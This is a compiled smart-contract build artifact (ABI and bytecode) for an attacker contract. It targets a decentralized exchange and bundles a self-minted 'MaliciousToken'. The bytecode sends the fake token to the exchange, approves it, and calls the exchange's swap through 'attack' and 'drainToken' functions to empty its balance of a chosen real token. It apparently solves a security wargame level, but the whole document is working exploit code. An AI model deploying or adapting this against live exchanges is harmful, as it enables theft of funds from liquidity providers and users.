{"abi":[{"type":"constructor","inputs":[{"name":"_dex","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"dex","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"drainToken","inputs":[{"name":"targetToken","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"getTokenAddresses","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"malToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract MaliciousToken"}],"stateMutability":"view"},{"type":"function","name":"token1","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"token2","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051611429380380611429833981016040819052602b91609a565b5f80546001600160a01b0319166001600160a01b038316179055604051604f90608d565b604051809103905ff0801580156067573d5f5f3e3d5ffd5b50600380546001600160a01b0319166001600160a01b03929092169190911790555060c5565b610c48806107e183390190565b5f6020828403121560a9575f5ffd5b81516001600160a01b038116811460be575f5ffd5b9392505050565b61070f806100d25f395ff3fe608060405234801561000f575f5ffd5b506004361061007a575f3560e01c80639e5faafc116100585780639e5faafc146100d2578063d21220a7146100dc578063e0b22c4c146100ef578063ee8c24b814610102575f5ffd5b806325be124e1461007e578063692058c2146100ad5780638cef23a8146100bf575b5f5ffd5b600254610091906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b5f54610091906001600160a01b031681565b600354610091906001600160a01b031681565b6100da61010a565b005b600154610091906001600160a01b031681565b6100da6100fd36600461063a565b61022a565b6100da61043d565b6003545f546040517fa9059cbb0000000000000000000000000000000000000000000000000000000081526001600160a01b0391821660048201526064602482015291169063a9059cbb906044016020604051808303815f875af1158015610174573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610198919061065c565b506003545f546040517f095ea7b30000000000000000000000000000000000000000000000000000000081526001600160a01b0391821660048201525f19602482015291169063095ea7b3906044016020604051808303815f875af1158015610203573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610227919061065c565b50565b5f80546040516370a0823160e01b81526001600160a01b039182166004820152908316906370a0823190602401602060405180830381865afa158015610272573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610296919061067b565b6003545f80546040516370a0823160e01b81526001600160a01b03918216600482015293945090929116906370a0823190602401602060405180830381865afa1580156102e5573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610309919061067b565b5f80546003546040516001600160a01b039182166024820152878216604482015260648101859052939450919291169060840160408051601f198184030181529181526020820180516001600160e01b03167fdf791e50000000000000000000000000000000000000000000000000000000001790525161038a9190610692565b5f604051808303815f865af19150503d805f81146103c3576040519150601f19603f3d011682016040523d82523d5f602084013e6103c8565b606091505b5050905080610437576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600b60248201527f53776170206661696c6564000000000000000000000000000000000000000000604482015260640160405180910390fd5b50505050565b5f805460408051600481526024810182526020810180516001600160e01b03167fd21220a700000000000000000000000000000000000000000000000000000000179052905183926001600160a01b03169161049891610692565b5f604051808303815f865af19150503d805f81146104d1576040519150601f19603f3d011682016040523d82523d5f602084013e6104d6565b606091505b50915091508180156104e857505f8151115b1561052f578080602001905181019061050191906106be565b6001805473ffffffffffffffffffffffffffffffffffffffff19166001600160a01b03929092169190911790555b5f805460408051600481526024810182526020810180516001600160e01b03167f25be124e00000000000000000000000000000000000000000000000000000000179052905183926001600160a01b03169161058a91610692565b5f604051808303815f865af19150503d805f81146105c3576040519150601f19603f3d011682016040523d82523d5f602084013e6105c8565b606091505b50915091508180156105da57505f8151115b1561043757808060200190518101906105f391906106be565b6002805473ffffffffffffffffffffffffffffffffffffffff19166001600160a01b039290921691909117905550505050565b6001600160a01b0381168114610227575f5ffd5b5f6020828403121561064a575f5ffd5b813561065581610626565b9392505050565b5f6020828403121561066c575f5ffd5b81518015158114610655575f5ffd5b5f6020828403121561068b575f5ffd5b5051919050565b5f82515f5b818110156106b15760208186018101518583015201610697565b505f920191825250919050565b5f602082840312156106ce575f5ffd5b81516106558161062656fea2646970667358221220c3d67f02c5aaad4ae6ebc5bf67ff633791f659a356c2c94eb36defb3894991b464736f6c634300081c0033608060405234801561000f575f5ffd5b50604051806040016040528060098152602001684d616c6963696f757360b81b8152506040518060400160405280600381526020016213505360ea1b815250816003908161005d9190610208565b50600461006a8282610208565b5050506100873369d3c21bcecceda100000061008c60201b60201c565b6102e7565b6001600160a01b0382166100e65760405162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015260640160405180910390fd5b8060025f8282546100f791906102c2565b90915550506001600160a01b0382165f90815260208190526040812080548392906101239084906102c2565b90915550506040518181526001600160a01b038316905f907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a35050565b505050565b634e487b7160e01b5f52604160045260245ffd5b600181811c9082168061019957607f821691505b6020821081036101b757634e487b7160e01b5f52602260045260245ffd5b50919050565b601f82111561016c57805f5260205f20601f840160051c810160208510156101e25750805b601f840160051c820191505b81811015610201575f81556001016101ee565b5050505050565b81516001600160401b0381111561022157610221610171565b6102358161022f8454610185565b846101bd565b6020601f821160018114610267575f83156102505750848201515b5f19600385901b1c1916600184901b178455610201565b5f84815260208120601f198516915b828110156102965787850151825560209485019460019092019101610276565b50848210156102b357868401515f19600387901b60f8161c191681555b50505050600190811b01905550565b808201808211156102e157634e487b7160e01b5f52601160045260245ffd5b92915050565b610954806102f45f395ff3fe608060405234801561000f575f5ffd5b50600436106100c4575f3560e01c8063395093511161007d578063a457c2d711610058578063a457c2d714610180578063a9059cbb14610193578063dd62ed3e146101a6575f5ffd5b8063395093511461013d57806370a082311461015057806395d89b4114610178575f5ffd5b806318160ddd116100ad57806318160ddd1461010957806323b872dd1461011b578063313ce5671461012e575f5ffd5b806306fdde03146100c8578063095ea7b3146100e6575b5f5ffd5b6100d06101de565b6040516100dd91906107ae565b60405180910390f35b6100f96100f4366004610814565b61026e565b60405190151581526020016100dd565b6002545b6040519081526020016100dd565b6100f961012936600461083c565b610287565b604051601281526020016100dd565b6100f961014b366004610814565b6102aa565b61010d61015e366004610876565b6001600160a01b03165f9081526020819052604090205490565b6100d06102e8565b6100f961018e366004610814565b6102f7565b6100f96101a1366004610814565b6103a5565b61010d6101b4366004610896565b6001600160a01b039182165f90815260016020908152604080832093909416825291909152205490565b6060600380546101ed906108c7565b80601f0160208091040260200160405190810160405280929190818152602001828054610219906108c7565b80156102645780601f1061023b57610100808354040283529160200191610264565b820191905f5260205f20905b81548152906001019060200180831161024757829003601f168201915b5050505050905090565b5f3361027b8185856103b2565b60019150505b92915050565b5f33610294858285610509565b61029f858585610599565b506001949350505050565b335f8181526001602090815260408083206001600160a01b038716845290915281205490919061027b90829086906102e39087906108ff565b6103b2565b6060600480546101ed906108c7565b335f8181526001602090815260408083206001600160a01b0387168452909152812054909190838110156103985760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f7760448201527f207a65726f00000000000000000000000000000000000000000000000000000060648201526084015b60405180910390fd5b61029f82868684036103b2565b5f3361027b818585610599565b6001600160a01b03831661042d5760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460448201527f7265737300000000000000000000000000000000000000000000000000000000606482015260840161038f565b6001600160a01b0382166104a95760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f20616464726560448201527f7373000000000000000000000000000000000000000000000000000000000000606482015260840161038f565b6001600160a01b038381165f8181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038381165f908152600160209081526040808320938616835292905220545f19811461059357818110156105865760405162461bcd60e51b815260206004820152601d60248201527f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000604482015260640161038f565b61059384848484036103b2565b50505050565b6001600160a01b0383166106155760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f20616460448201527f6472657373000000000000000000000000000000000000000000000000000000606482015260840161038f565b6001600160a01b0382166106915760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201527f6573730000000000000000000000000000000000000000000000000000000000606482015260840161038f565b6001600160a01b0383165f908152602081905260409020548181101561071f5760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e742065786365656473206260448201527f616c616e63650000000000000000000000000000000000000000000000000000606482015260840161038f565b6001600160a01b038085165f908152602081905260408082208585039055918516815290812080548492906107559084906108ff565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef846040516107a191815260200190565b60405180910390a3610593565b602081525f82518060208401525f5b818110156107da57602081860181015160408684010152016107bd565b505f604082850101526040601f19601f83011684010191505092915050565b80356001600160a01b038116811461080f575f5ffd5b919050565b5f5f60408385031215610825575f5ffd5b61082e836107f9565b946020939093013593505050565b5f5f5f6060848603121561084e575f5ffd5b610857846107f9565b9250610865602085016107f9565b929592945050506040919091013590565b5f60208284031215610886575f5ffd5b61088f826107f9565b9392505050565b5f5f604083850312156108a7575f5ffd5b6108b0836107f9565b91506108be602084016107f9565b90509250929050565b600181811c908216806108db57607f821691505b6020821081036108f957634e487b7160e01b5f52602260045260245ffd5b50919050565b8082018082111561028157634e487b7160e01b5f52601160045260245ffdfea264697066735822122098c47776554adb6a2fa6b412d76ba9efbcd555f2765aa44d43b362fa0cdcde7264736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","dex()":"692058c2","drainToken(address)":"e0b22c4c","getTokenAddresses()":"ee8c24b8","malToken()":"8cef23a8","token1()":"d21220a7","token2()":"25be124e"},"id":4}